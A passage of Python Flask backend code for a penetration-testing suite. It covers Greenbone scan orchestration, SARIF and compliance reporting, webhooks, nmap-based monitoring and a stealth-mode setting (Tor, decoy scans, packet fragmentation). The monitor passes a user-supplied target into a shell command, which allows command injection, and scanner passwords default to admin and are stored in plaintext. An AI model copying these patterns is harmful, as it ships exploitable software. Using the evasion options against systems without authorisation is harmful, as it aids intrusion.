        seen_titles.add(title)

        findings.append({
            "id": str(uuid.uuid4()),
            "title": title,
            "severity": severity, "status": "open",
            "cve": cve, "cvss": cvss_score,
            "description": description,
            "evidence": "\n".join(ev_parts),
            "remediation": solution,
            "hosts": [host_ip or target_ip],
            "source": "greenbone",
            "created_at": datetime.now().isoformat(),
        })

    return findings


@app.route("/api/projects/<project_id>/greenbone/scan", methods=["POST"])
@api_login_required
def greenbone_scan(project_id):
    project = read_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404

    data = request.json or {}
    socket_path = data.get("socket_path", "/run/gvmd/gvmd.sock")
    gmp_user = data.get("gmp_user", "admin")
    gmp_pass = data.get("gmp_pass", "admin")
    target_ip = data.get("target_ip", "").strip()
    config_key = data.get("scan_config", "full_fast")

    if not target_ip:
        return jsonify({"error": "target_ip required"}), 400

    scan_config_id = GVM_SCAN_CONFIGS.get(config_key, GVM_SCAN_CONFIGS["full_fast"])
    ts = datetime.now().strftime("%Y%m%d%H%M%S")

    try:
        # 1. Create target
        target_xml = (
            f"<create_target>"
            f"<name>PentestSuite-{target_ip}-{ts}</name>"
            f"<hosts>{target_ip}</hosts>"
            f"<port_list id='{GVM_ALL_TCP_PORT_LIST}'/>"
            f"</create_target>"
        )
        root = _gvm_exec(socket_path, gmp_user, gmp_pass, target_xml)
        target_id = root.get("id", "")
        if not target_id:
            return jsonify({"error": "GVM target creation failed", "detail": ET.tostring(root, encoding="unicode")[:300]}), 500

        # 2. Create task
        task_xml = (
            f"<create_task>"
            f"<name>PentestSuite-{target_ip}-{ts}</name>"
            f"<config id='{scan_config_id}'/>"
            f"<target id='{target_id}'/>"
            f"<scanner id='{GVM_OPENVAS_SCANNER}'/>"
            f"</create_task>"
        )
        root = _gvm_exec(socket_path, gmp_user, gmp_pass, task_xml)
        task_id = root.get("id", "")
        if not task_id:
            return jsonify({"error": "GVM task creation failed"}), 500

        # 3. Start task
        start_xml = f"<start_task task_id='{task_id}'/>"
        root = _gvm_exec(socket_path, gmp_user, gmp_pass, start_xml)
        report_id = ""
        rep_el = root.find("report_id")
        if rep_el is not None:
            report_id = (rep_el.text or "").strip()

    except (TimeoutError, ValueError, Exception) as e:
        return jsonify({"error": str(e)}), 500

    # Persist scan state in project
    project.setdefault("greenbone", {})[target_ip] = {
        "task_id": task_id,
        "target_id": target_id,
        "report_id": report_id,
        "socket_path": socket_path,
        "gmp_user": gmp_user,
        "gmp_pass": gmp_pass,
        "target_ip": target_ip,
        "scan_config": config_key,
        "started_at": datetime.now().isoformat(),
        "status": "running",
    }
    write_project(project)
    return jsonify({"ok": True, "task_id": task_id, "target_id": target_id, "report_id": report_id})


@app.route("/api/projects/<project_id>/greenbone/status/<task_id>")
@api_login_required
def greenbone_status(project_id, task_id):
    project = read_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404

    # Find stored config for this task
    gb_state = {}
    for ip, state in project.get("greenbone", {}).items():
        if state.get("task_id") == task_id:
            gb_state = state
            break
    if not gb_state:
        return jsonify({"error": "Task not found in project"}), 404

    socket_path = gb_state.get("socket_path", "/run/gvmd/gvmd.sock")
    gmp_user = gb_state.get("gmp_user", "admin")
    gmp_pass = gb_state.get("gmp_pass", "admin")

    try:
        root = _gvm_exec(socket_path, gmp_user, gmp_pass,
                         f"<get_tasks task_id='{task_id}'/>")
        task_el = root.find(".//task")
        if task_el is None:
            return jsonify({"status": "unknown", "progress": 0})

        status_el = task_el.find("status")
        progress_el = task_el.find("progress")
        last_report = task_el.find(".//last_report/report")

        status = (status_el.text or "unknown").strip() if status_el is not None else "unknown"
        progress = int((progress_el.text or "0").strip()) if progress_el is not None else 0
        report_id = ""
        if last_report is not None:
            report_id = last_report.get("id", "")

        # Update stored report_id if we got one
        if report_id and not gb_state.get("report_id"):
            for ip, state in project.get("greenbone", {}).items():
                if state.get("task_id") == task_id:
                    state["report_id"] = report_id
                    state["status"] = status
            write_project(project)

        return jsonify({"status": status, "progress": progress, "report_id": report_id})

    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/projects/<project_id>/greenbone/import/<task_id>", methods=["POST"])
@api_login_required
def greenbone_import(project_id, task_id):
    project = read_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404

    # Find stored config
    gb_state = {}
    for ip, state in project.get("greenbone", {}).items():
        if state.get("task_id") == task_id:
            gb_state = state
            break
    if not gb_state:
        return jsonify({"error": "Task not found in project"}), 404

    socket_path = gb_state.get("socket_path", "/run/gvmd/gvmd.sock")
    gmp_user = gb_state.get("gmp_user", "admin")
    gmp_pass = gb_state.get("gmp_pass", "admin")
    report_id = gb_state.get("report_id", "")
    target_ip = gb_state.get("target_ip", "")

    if not report_id:
        # Try to get it from task status first
        try:
            root = _gvm_exec(socket_path, gmp_user, gmp_pass,
                             f"<get_tasks task_id='{task_id}'/>")
            lr = root.find(".//last_report/report")
            if lr is not None:
                report_id = lr.get("id", "")
        except Exception:
            pass
    if not report_id:
        return jsonify({"error": "No report_id available — scan may still be running"}), 400

    try:
        root = _gvm_exec(socket_path, gmp_user, gmp_pass,
                         f"<get_reports report_id='{report_id}' filter='rows=-1 min_qod=30' details='1'/>",
                         timeout=120)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

    new_findings = _gvm_parse_report(root, target_ip)
    if not new_findings:
        return jsonify({"imported": 0, "message": "No findings in report (check min_qod / scan status)"})

    existing_findings = project.get("findings", [])
    seen_titles = {f.get("title", "") for f in existing_findings}
    added = 0
    for f in new_findings:
        if f["title"] not in seen_titles:
            existing_findings.append(f)
            seen_titles.add(f["title"])
            added += 1
    project["findings"] = existing_findings
    write_project(project)
    return jsonify({"imported": added, "total_in_report": len(new_findings)})


@app.route("/api/projects/<project_id>/greenbone/state")
@api_login_required
def greenbone_state(project_id):
    """Return all Greenbone scan states for this project."""
    project = read_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404
    states = []
    for ip, state in project.get("greenbone", {}).items():
        safe_state = {k: v for k, v in state.items() if k not in ("gmp_pass",)}
        states.append(safe_state)
    return jsonify(states)


# ═══════════════════════════════════════════════════════════════════════════
# TIER 3 — H1: Multi-tenant SaaS model (organizations, API keys, plan limits)
# ═══════════════════════════════════════════════════════════════════════════
ORGS_FILE = BASE_DIR / "data" / "organizations.json"

def _load_orgs():
    if ORGS_FILE.exists():
        with open(ORGS_FILE, encoding="utf-8") as f:
            return json.load(f)
    return {}

def _save_orgs(orgs):
    with open(ORGS_FILE, "w", encoding="utf-8") as f:
        json.dump(orgs, f, indent=2)

PLAN_LIMITS = {
    "free":       {"scans_per_month": 5,  "targets_per_scan": 1,  "reports": False, "api": False},
    "starter":    {"scans_per_month": 30, "targets_per_scan": 5,  "reports": True,  "api": False},
    "pro":        {"scans_per_month": 100,"targets_per_scan": 20, "reports": True,  "api": True},
    "enterprise": {"scans_per_month": -1, "targets_per_scan": -1, "reports": True,  "api": True},
}

@app.route("/api/orgs", methods=["GET"])
@api_login_required
def list_orgs():
    return jsonify(list(_load_orgs().values()))

@app.route("/api/orgs", methods=["POST"])
@api_login_required
def create_org():
    import secrets as _secrets
    data = request.json or {}
    orgs = _load_orgs()
    org_id = str(uuid.uuid4())
    api_key = "pk_" + _secrets.token_hex(24)
    org = {
        "id": org_id,
        "name": data.get("name", "New Organization"),
        "plan": data.get("plan", "free"),
        "api_key": api_key,
        "created_at": datetime.utcnow().isoformat(),
        "scan_count_month": 0,
        "members": [session.get("user", "admin")],
        "settings": {"webhook_url": "", "jira_url": "", "jira_token": "", "slack_url": ""},
    }
    orgs[org_id] = org
    _save_orgs(orgs)
    return jsonify(org), 201

@app.route("/api/orgs/<org_id>", methods=["GET", "PUT"])
@api_login_required
def manage_org(org_id):
    orgs = _load_orgs()
    if org_id not in orgs:
        return jsonify({"error": "Not found"}), 404
    if request.method == "PUT":
        data = request.json or {}
        orgs[org_id].update({k: v for k, v in data.items()
                              if k in ("name", "plan", "settings")})
        _save_orgs(orgs)
    return jsonify(orgs[org_id])

@app.route("/api/orgs/<org_id>/rotate-key", methods=["POST"])
@api_login_required
def rotate_api_key(org_id):
    import secrets as _secrets
    orgs = _load_orgs()
    if org_id not in orgs:
        return jsonify({"error": "Not found"}), 404
    new_key = "pk_" + _secrets.token_hex(24)
    orgs[org_id]["api_key"] = new_key
    _save_orgs(orgs)
    return jsonify({"api_key": new_key})

@app.route("/api/orgs/<org_id>/plan-limits")
@api_login_required
def get_plan_limits(org_id):
    orgs = _load_orgs()
    if org_id not in orgs:
        return jsonify({"error": "Not found"}), 404
    plan = orgs[org_id].get("plan", "free")
    limits = PLAN_LIMITS.get(plan, PLAN_LIMITS["free"])
    usage = {"scan_count_month": orgs[org_id].get("scan_count_month", 0)}
    return jsonify({"plan": plan, "limits": limits, "usage": usage})

# ═══════════════════════════════════════════════════════════════════════════
# TIER 3 — H2: CI/CD Integration (SARIF export, webhooks, Jira, Slack)
# ═══════════════════════════════════════════════════════════════════════════

@app.route("/api/projects/<project_id>/report/sarif")
@api_login_required
def export_sarif(project_id):
    """Export findings in SARIF 2.1.0 format for GitHub Advanced Security / VS Code."""
    project = load_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404

    SARIF_SEVERITY_MAP = {
        "critical": "error", "high": "error",
        "medium": "warning", "low": "note", "info": "none"
    }
    rules = []
    results = []
    rule_ids_seen = set()

    for f in project.get("findings", []):
        sev = f.get("severity", "info").lower()
        title = f.get("title", "Unknown Finding")
        desc = f.get("description", "")
        cve = f.get("cve", "")
        rule_id = re.sub(r'[^a-zA-Z0-9\-]', '-', title[:50]).strip("-")
        if not rule_id:
            rule_id = "PENTEST-001"

        if rule_id not in rule_ids_seen:
            rule_ids_seen.add(rule_id)
            rule = {
                "id": rule_id,
                "name": title,
                "shortDescription": {"text": title},
                "fullDescription": {"text": desc[:500]},
                "helpUri": f"https://nvd.nist.gov/vuln/detail/{cve}" if cve else "https://owasp.org",
                "defaultConfiguration": {"level": SARIF_SEVERITY_MAP.get(sev, "warning")},
                "properties": {"security-severity": {
                    "critical": "9.5", "high": "8.0",
                    "medium": "5.0", "low": "2.0", "info": "0.0"
                }.get(sev, "5.0")},
            }
            rules.append(rule)

        result = {
            "ruleId": rule_id,
            "level": SARIF_SEVERITY_MAP.get(sev, "warning"),
            "message": {"text": desc[:300] or title},
            "locations": [{
                "physicalLocation": {
                    "artifactLocation": {
                        "uri": f.get("target", project.get("target", "unknown")),
                        "uriBaseId": "%SRCROOT%"
                    },
                    "region": {"startLine": 1}
                }
            }],
            "properties": {
                "severity": sev,
                "cve": cve,
                "mitre": f.get("mitre", ""),
                "cvss": f.get("cvss_score", ""),
            }
        }
        results.append(result)

    sarif_doc = {
        "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
        "version": "2.1.0",
        "runs": [{
            "tool": {
                "driver": {
                    "name": "PentSuite",
                    "version": "1.0.0",
                    "informationUri": "https://github.com/javii278/pentsuite",
                    "rules": rules
                }
            },
            "results": results,
            "properties": {
                "project": project.get("name", ""),
                "target": project.get("target", ""),
                "scan_date": project.get("updated_at", ""),
            }
        }]
    }
    return Response(
        json.dumps(sarif_doc, indent=2),
        mimetype="application/json",
        headers={"Content-Disposition": f"attachment; filename=pentest-{project_id[:8]}.sarif"}
    )


@app.route("/api/projects/<project_id>/webhooks/test", methods=["POST"])
@api_login_required
def test_webhook(project_id):
    """Send a test notification to configured webhook."""
    import urllib.request as _ureq
    data = request.json or {}
    webhook_url = data.get("webhook_url", "")
    webhook_type = data.get("type", "generic")  # generic, slack, teams

    if not webhook_url:
        return jsonify({"error": "webhook_url required"}), 400

    project = load_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404

    findings = project.get("findings", [])
    critical_count = sum(1 for f in findings if f.get("severity") == "critical")
    high_count = sum(1 for f in findings if f.get("severity") == "high")

    if webhook_type == "slack":
        payload = {
            "text": f"🔴 PentSuite Alert — {project.get('name', project_id)}",
            "attachments": [{
                "color": "danger" if critical_count > 0 else "warning",
                "fields": [
                    {"title": "Target", "value": project.get("target", "N/A"), "short": True},
                    {"title": "Critical", "value": str(critical_count), "short": True},
                    {"title": "High", "value": str(high_count), "short": True},
                    {"title": "Total Findings", "value": str(len(findings)), "short": True},
                ],
                "footer": "PentSuite Autopilot",
                "ts": int(datetime.utcnow().timestamp()),
            }]
        }
    elif webhook_type == "teams":
        payload = {
            "@type": "MessageCard",
            "@context": "http://schema.org/extensions",
            "themeColor": "FF0000" if critical_count > 0 else "FFA500",
            "summary": f"PentSuite: {critical_count} critical findings",
            "sections": [{
                "activityTitle": f"Pentest Report — {project.get('name', project_id)}",
                "facts": [
                    {"name": "Target", "value": project.get("target", "N/A")},
                    {"name": "Critical", "value": str(critical_count)},
                    {"name": "High", "value": str(high_count)},
                    {"name": "Total", "value": str(len(findings))},
                ]
            }]
        }
    elif webhook_type == "jira":
        # Jira webhook — create issue for each critical finding
        jira_token = data.get("jira_token", "")
        jira_project = data.get("jira_project", "SEC")
        created_issues = []
        for f in [x for x in findings if x.get("severity") in ("critical", "high")][:5]:
            issue_payload = json.dumps({
                "fields": {
                    "project": {"key": jira_project},
                    "summary": f"[PentSuite] {f.get('title', 'Security Finding')}",
                    "description": f.get("description", "")[:1000],
                    "issuetype": {"name": "Bug"},
                    "priority": {"name": "Highest" if f.get("severity") == "critical" else "High"},
                    "labels": ["security", "pentest", f.get("severity", "medium")],
                }
            }).encode("utf-8")
            try:
                req = _ureq.Request(
                    webhook_url + "/rest/api/2/issue",
                    data=issue_payload,
                    headers={
                        "Content-Type": "application/json",
                        "Authorization": f"Basic {jira_token}",
                    }
                )
                with _ureq.urlopen(req, timeout=10) as resp:
                    resp_data = json.loads(resp.read())
                    created_issues.append(resp_data.get("key", "?"))
            except Exception as e:
                return jsonify({"error": str(e), "created": created_issues}), 500
        return jsonify({"status": "ok", "created_issues": created_issues})
    else:
        payload = {
            "project": project.get("name", project_id),
            "target": project.get("target", ""),
            "critical": critical_count,
            "high": high_count,
            "total": len(findings),
            "top_findings": [{"title": f.get("title"), "severity": f.get("severity")} for f in findings[:5]],
        }

    try:
        req_data = json.dumps(payload).encode("utf-8")
        req = _ureq.Request(
            webhook_url,
            data=req_data,
            headers={"Content-Type": "application/json", "User-Agent": "PentSuite/1.0"},
        )
        with _ureq.urlopen(req, timeout=10) as resp:
            return jsonify({"status": "ok", "http_code": resp.status})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/projects/<project_id>/notify-findings", methods=["POST"])
@api_login_required
def notify_new_findings(project_id):
    """Push new critical/high findings to all configured webhooks."""
    import urllib.request as _ureq
    project = load_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404

    data = request.json or {}
    webhook_url = data.get("webhook_url") or project.get("webhook_url", "")
    if not webhook_url:
        return jsonify({"skipped": "no webhook configured"}), 200

    new_findings = [f for f in project.get("findings", [])
                    if f.get("severity") in ("critical", "high") and not f.get("notified")]

    sent = 0
    for f in new_findings[:10]:
        payload = json.dumps({
            "text": f"🚨 [{f.get('severity','?').upper()}] {f.get('title','')}",
            "project": project.get("name", project_id),
            "target": project.get("target", ""),
            "description": f.get("description", "")[:200],
            "cve": f.get("cve", ""),
        }).encode("utf-8")
        try:
            req = _ureq.Request(webhook_url, data=payload,
                                headers={"Content-Type": "application/json"})
            _ureq.urlopen(req, timeout=8)
            f["notified"] = True
            sent += 1
        except Exception:
            pass

    if sent > 0:
        save_project(project)

    return jsonify({"sent": sent, "total_new": len(new_findings)})


# ═══════════════════════════════════════════════════════════════════════════
# TIER 3 — H3: Compliance report (OWASP, PCI-DSS, ISO 27001, NIST CSF)
# ═══════════════════════════════════════════════════════════════════════════

_COMPLIANCE_CONTROLS = {
    "OWASP Top 10 2021": [
        "A01:2021 — Broken Access Control",
        "A02:2021 — Cryptographic Failures",
        "A03:2021 — Injection",
        "A04:2021 — Insecure Design",
        "A05:2021 — Security Misconfiguration",
        "A06:2021 — Vulnerable and Outdated Components",
        "A07:2021 — Identification and Authentication Failures",
        "A08:2021 — Software and Data Integrity Failures",
        "A09:2021 — Security Logging and Monitoring Failures",
        "A10:2021 — Server-Side Request Forgery (SSRF)",
    ],
    "PCI-DSS 4.0": [
        "Req 1 — Install and maintain network security controls",
        "Req 2 — Apply secure configurations",
        "Req 3 — Protect stored account data",
        "Req 4 — Protect cardholder data in transit (TLS)",
        "Req 5 — Protect against malicious software",
        "Req 6 — Develop and maintain secure systems (patching)",
        "Req 7 — Restrict access by business need",
        "Req 8 — Identify users and authenticate access",
        "Req 10 — Log and monitor all access",
        "Req 11 — Test security of systems regularly",
    ],
    "ISO 27001:2022": [
        "A.5 — Organizational Controls",
        "A.8.8 — Management of technical vulnerabilities",
        "A.8.9 — Configuration management",
        "A.8.20 — Networks security",
        "A.8.23 — Web filtering",
        "A.8.25 — Secure development life cycle",
        "A.8.28 — Secure coding",
        "A.8.29 — Security testing in development and acceptance",
    ],
    "NIST CSF 2.0": [
        "ID.RA — Risk Assessment",
        "PR.AC — Identity Management and Access Control",
        "PR.DS — Data Security",
        "PR.IP — Information Protection Processes",
        "DE.CM — Security Continuous Monitoring",
        "RS.RP — Response Planning",
    ],
}

_FINDING_TO_CONTROLS = {
    r'sql.inject|sqli':
        {"OWASP Top 10 2021": ["A03:2021 — Injection"],
         "PCI-DSS 4.0": ["Req 6 — Develop and maintain secure systems (patching)"],
         "ISO 27001:2022": ["A.8.28 — Secure coding"],
         "NIST CSF 2.0": ["ID.RA — Risk Assessment"]},
    r'xss|cross.site':
        {"OWASP Top 10 2021": ["A03:2021 — Injection"],
         "PCI-DSS 4.0": ["Req 6 — Develop and maintain secure systems (patching)"]},
    r'ssrf':
        {"OWASP Top 10 2021": ["A10:2021 — Server-Side Request Forgery (SSRF)"],
         "PCI-DSS 4.0": ["Req 1 — Install and maintain network security controls"]},
    r'auth.*bypass|jwt|oauth|token':
        {"OWASP Top 10 2021": ["A07:2021 — Identification and Authentication Failures"],
         "PCI-DSS 4.0": ["Req 8 — Identify users and authenticate access"],
         "ISO 27001:2022": ["A.8.5 — Secure authentication"]},
    r'ssl|tls|heartbleed|cipher':
        {"OWASP Top 10 2021": ["A02:2021 — Cryptographic Failures"],
         "PCI-DSS 4.0": ["Req 4 — Protect cardholder data in transit (TLS)"],
         "ISO 27001:2022": ["A.8.20 — Networks security"]},
    r'patch|cve-|ms17|ms08|eternalblue|bluekeep':
        {"OWASP Top 10 2021": ["A06:2021 — Vulnerable and Outdated Components"],
         "PCI-DSS 4.0": ["Req 6 — Develop and maintain secure systems (patching)",
                         "Req 11 — Test security of systems regularly"],
         "NIST CSF 2.0": ["ID.RA — Risk Assessment", "DE.CM — Security Continuous Monitoring"]},
    r'default.*cred|weak.*pass|brute':
        {"OWASP Top 10 2021": ["A07:2021 — Identification and Authentication Failures"],
         "PCI-DSS 4.0": ["Req 8 — Identify users and authenticate access"],
         "ISO 27001:2022": ["A.5 — Organizational Controls"]},
    r'misconfigur|exposed.*port|open.*service':
        {"OWASP Top 10 2021": ["A05:2021 — Security Misconfiguration"],
         "PCI-DSS 4.0": ["Req 2 — Apply secure configurations"],
         "ISO 27001:2022": ["A.8.9 — Configuration management"]},
    r'privesc|privilege|root|admin':
        {"OWASP Top 10 2021": ["A01:2021 — Broken Access Control"],
         "PCI-DSS 4.0": ["Req 7 — Restrict access by business need"],
         "ISO 27001:2022": ["A.5 — Organizational Controls"],
         "NIST CSF 2.0": ["PR.AC — Identity Management and Access Control"]},
    r's3.*bucket|cloud.*misconfigur|terraform':
        {"OWASP Top 10 2021": ["A05:2021 — Security Misconfiguration"],
         "PCI-DSS 4.0": ["Req 1 — Install and maintain network security controls",
                         "Req 3 — Protect stored account data"]},
}


def _map_finding_compliance(finding):
    """Map a finding to relevant compliance controls."""
    text = f"{finding.get('title', '')} {finding.get('description', '')}".lower()
    mapped = {}
    for pattern, controls in _FINDING_TO_CONTROLS.items():
        if re.search(pattern, text, re.IGNORECASE):
            for fw, items in controls.items():
                if fw not in mapped:
                    mapped[fw] = []
                for item in items:
                    if item not in mapped[fw]:
                        mapped[fw].append(item)
    return mapped


@app.route("/api/projects/<project_id>/report/compliance")
@api_login_required
def export_compliance_report(project_id):
    """Generate a compliance mapping report (OWASP/PCI/ISO/NIST)."""
    project = load_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404

    findings = project.get("findings", [])
    framework = request.args.get("framework", "all")

    # Build compliance matrix
    compliance_matrix = {}
    for fw, controls in _COMPLIANCE_CONTROLS.items():
        if framework != "all" and framework.lower() not in fw.lower():
            continue
        compliance_matrix[fw] = {}
        for control in controls:
            matching = []
            for f in findings:
                mapped = _map_finding_compliance(f)
                if fw in mapped and control in mapped[fw]:
                    matching.append({
                        "id": f.get("id", ""),
                        "title": f.get("title", ""),
                        "severity": f.get("severity", ""),
                    })
            compliance_matrix[fw][control] = {
                "status": "FAIL" if matching else "PASS",
                "findings": matching,
                "count": len(matching),
            }

    # Summary stats
    summary = {}
    for fw, controls in compliance_matrix.items():
        fail_count = sum(1 for c in controls.values() if c["status"] == "FAIL")
        total = len(controls)
        summary[fw] = {
            "pass": total - fail_count,
            "fail": fail_count,
            "total": total,
            "compliance_pct": round((total - fail_count) / total * 100, 1) if total else 100,
        }

    return jsonify({
        "project": project.get("name", ""),
        "target": project.get("target", ""),
        "scan_date": project.get("updated_at", ""),
        "summary": summary,
        "matrix": compliance_matrix,
        "total_findings": len(findings),
    })


@app.route("/api/projects/<project_id>/findings/<finding_id>/compliance")
@api_login_required
def get_finding_compliance(project_id, finding_id):
    """Get compliance controls relevant to a specific finding."""
    project = load_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404
    finding = next((f for f in project.get("findings", []) if f.get("id") == finding_id), None)
    if not finding:
        return jsonify({"error": "Finding not found"}), 404
    return jsonify({"compliance": _map_finding_compliance(finding)})


# ═══════════════════════════════════════════════════════════════════════════
# TIER 3 — H4: Continuous monitoring (schedule scans, CVE alerting)
# ═══════════════════════════════════════════════════════════════════════════
MONITORS_FILE = BASE_DIR / "data" / "monitors.json"

def _load_monitors():
    if MONITORS_FILE.exists():
        with open(MONITORS_FILE, encoding="utf-8") as f:
            return json.load(f)
    return {}

def _save_monitors(monitors):
    with open(MONITORS_FILE, "w", encoding="utf-8") as f:
        json.dump(monitors, f, indent=2)


@app.route("/api/monitors", methods=["GET"])
@api_login_required
def list_monitors():
    return jsonify(list(_load_monitors().values()))


@app.route("/api/monitors", methods=["POST"])
@api_login_required
def create_monitor():
    """Create a continuous monitoring job for a target."""
    data = request.json or {}
    monitors = _load_monitors()
    mon_id = str(uuid.uuid4())
    monitor = {
        "id": mon_id,
        "name": data.get("name", "Monitor"),
        "target": data.get("target", ""),
        "project_id": data.get("project_id", ""),
        "interval_hours": int(data.get("interval_hours", 24)),
        "enabled": True,
        "mode": data.get("mode", "light"),  # light / full
        "webhook_url": data.get("webhook_url", ""),
        "cve_alert": data.get("cve_alert", True),
        "last_run": None,
        "next_run": datetime.utcnow().isoformat(),
        "created_at": datetime.utcnow().isoformat(),
        "run_count": 0,
        "alert_count": 0,
    }
    monitors[mon_id] = monitor
    _save_monitors(monitors)
    return jsonify(monitor), 201


@app.route("/api/monitors/<mon_id>", methods=["GET", "PUT", "DELETE"])
@api_login_required
def manage_monitor(mon_id):
    monitors = _load_monitors()
    if mon_id not in monitors:
        return jsonify({"error": "Not found"}), 404
    if request.method == "DELETE":
        del monitors[mon_id]
        _save_monitors(monitors)
        return jsonify({"deleted": True})
    if request.method == "PUT":
        data = request.json or {}
        monitors[mon_id].update({k: v for k, v in data.items()
                                  if k in ("name", "interval_hours", "enabled", "mode",
                                           "webhook_url", "cve_alert")})
        _save_monitors(monitors)
    return jsonify(monitors[mon_id])


@app.route("/api/monitors/<mon_id>/run", methods=["POST"])
@api_login_required
def run_monitor_now(mon_id):
    """Trigger an immediate monitoring scan for a monitor."""
    monitors = _load_monitors()
    if mon_id not in monitors:
        return jsonify({"error": "Not found"}), 404
    monitor = monitors[mon_id]
    target = monitor.get("target", "")
    project_id = monitor.get("project_id", "")
    if not target or not project_id:
        return jsonify({"error": "Monitor missing target or project_id"}), 400

    # Run a lightweight scan in background
    def _light_scan():
        import subprocess
        result = subprocess.run(
            f"nmap -sV -T4 --open -p 22,80,443,445,8080,8443,3389,21,25 {target} 2>/dev/null",
            shell=True, capture_output=True, text=True, timeout=120
        )
        out = result.stdout
        # Parse for new open ports / version changes
        new_ports = re.findall(r'(\d+)/tcp\s+open\s+(\S+)\s*(.*)', out)
        project = load_project(project_id)
        if not project:
            return
        existing_ports = {str(p.get("port")): p.get("version", "") for p in project.get("ports", [])}
        alerts = []
        for port, svc, ver in new_ports:
            if port not in existing_ports:
                alerts.append(f"NEW PORT: {port}/tcp {svc} {ver}")
            elif ver and ver.strip() != existing_ports.get(port, "").strip():
                alerts.append(f"VERSION CHANGE: {port}/tcp {svc} {ver} (was: {existing_ports[port]})")
        if alerts:
            monitor["alert_count"] += int(len(alerts))
            _save_findings_direct = [{
                "title": f"Monitor Alert: {a}",
                "severity": "medium",
                "description": f"Cambio detectado en {target}:\n{a}\n\nScan output:\n{out[:300]}",
                "cve": "",
            } for a in alerts]
            # Save to project
            for finding in _save_findings_direct:
                finding["id"] = str(uuid.uuid4())
                finding["created_at"] = datetime.utcnow().isoformat()
                project.setdefault("findings", []).append(finding)
            save_project(project)
            # Send webhook
            wh = monitor.get("webhook_url", "")
            if wh and alerts:
                try:
                    import urllib.request as _ureq
                    payload = json.dumps({
                        "text": f"🔔 Monitor Alert: {len(alerts)} change(s) on {target}",
                        "alerts": alerts,
                        "project_id": project_id,
                    }).encode()
                    _ureq.urlopen(_ureq.Request(wh, data=payload,
                                                headers={"Content-Type": "application/json"}), timeout=8)
                except Exception:
                    pass
        monitor["last_run"] = datetime.utcnow().isoformat()
        monitor["run_count"] = monitor.get("run_count", 0) + 1
        monitor["next_run"] = (datetime.utcnow() + timedelta(hours=monitor.get("interval_hours", 24))).isoformat()
        _save_monitors(monitors)

    import threading as _thr
    _thr.Thread(target=_light_scan, daemon=True).start()
    return jsonify({"status": "running", "monitor": mon_id})


# ═══════════════════════════════════════════════════════════════════════════
# TIER 3 — H5: Stealth mode config endpoint
# ═══════════════════════════════════════════════════════════════════════════

@app.route("/api/projects/<project_id>/autopilot/stealth", methods=["GET", "PUT"])
@api_login_required
def autopilot_stealth_config(project_id):
    """Configure stealth mode options for the autopilot engine."""
    project = load_project(project_id)
    if not project:
        return jsonify({"error": "Not found"}), 404
    if request.method == "PUT":
        data = request.json or {}
        project.setdefault("stealth_config", {}).update({
            k: v for k, v in data.items()
            if k in ("enabled", "timing_min_ms", "timing_max_ms",
                     "use_tor", "decoy_scan", "fragment_packets",
                     "random_user_agents", "rotate_source_port")
        })
        save_project(project)
    return jsonify(project.get("stealth_config", {
        "enabled": False,
        "timing_min_ms": 100,
        "timing_max_ms": 3000,
        "use_tor": False,
        "decoy_scan": False,
        "fragment_packets": False,
        "random_user_agents": True,
        "rotate_source_port": False,
    }))


# ═══════════════════════════════════════════════════════════════════════════
# TIER 3 — H2: GitHub Actions / GitLab CI webhook receiver
# ═══════════════════════════════════════════════════════════════════════════

@app.route("/api/cicd/webhook", methods=["POST"])
def cicd_webhook():
    """Receive CI/CD push events and auto-trigger a scan."""
    import hmac as _hmac
    import hashlib as _hashlib
    data = request.json or {}
    event_type = request.headers.get("X-GitHub-Event") or request.headers.get("X-Gitlab-Event", "push")
    repo = data.get("repository", {}).get("full_name", "unknown")
    ref = data.get("ref", "refs/heads/main")
    target_url = (data.get("repository", {}).get("homepage") or
                  data.get("repository", {}).get("url", ""))

    # Validate GitHub signature if secret configured
    webhook_secret = os.environ.get("CICD_WEBHOOK_SECRET", "")
    if webhook_secret:
        sig = request.headers.get("X-Hub-Signature-256", "")
        expected = "sha256=" + _hmac.new(webhook_secret.encode(), request.data, _hashlib.sha256).hexdigest()
        if not _hmac.compare_digest(sig, expected):
            return jsonify({"error": "Invalid signature"}), 401

    if event_type not in ("push", "Push Hook", "merge_request") or "main" not in ref and "master" not in ref:
        return jsonify({"skipped": f"event {event_type} on {ref}"}), 200

    # Create a new project for this CI/CD scan
    new_project_data = {
        "name": f"CI/CD: {repo} [{ref.split('/')[-1]}]",
        "target": re.sub(r'https?://', '', target_url).rstrip("/") if target_url else repo,
        "type": "web",
        "created_via": "cicd_webhook",
        "repo": repo,
        "ref": ref,
    }

    # Use existing create_project logic
    projects = load_projects()
    proj_id = str(uuid.uuid4())
    new_project_data["id"] = proj_id
    new_project_data["created_at"] = datetime.utcnow().isoformat()
    new_project_data["findings"] = []
    projects[proj_id] = new_project_data
    save_projects(projects)

    return jsonify({
        "status": "queued",
        "project_id": proj_id,
        "target": new_project_data["target"],
        "sarif_url": f"/api/projects/{proj_id}/report/sarif",
        "compliance_url": f"/api/projects/{proj_id}/report/compliance",
    }), 201


# ═══════════════════════════════════════════════════════════════════════════
# C3 — Risk Score Aggregado
# ═══════════════════════════════════════════════════════════════════════════

@app.route("/api/projects/<project_id>/risk-score", methods=["GET"])
def get_risk_score(project_id):
    """C3: Single aggregated risk score for a project."""
    project = read_project(project_id)
    if not project:
        return jsonify({"error": "not found"}), 404
    findings = project.get("findings", [])
    sev_w = {"critical": 10, "high": 7, "medium": 4, "low": 1, "info": 0}
    total_w = sum(sev_w.get(f.get("severity","info"), 0) for f in findings)
    n = len(findings) or 1
    # Score increases with both severity weight and total count
    raw = min(10.0, (total_w / n) * (1 + n * 0.015)) if findings else 0.0
    breakdown = {s: sum(1 for f in findings if f.get("severity")==s)
                 for s in ("critical","high","medium","low","info")}
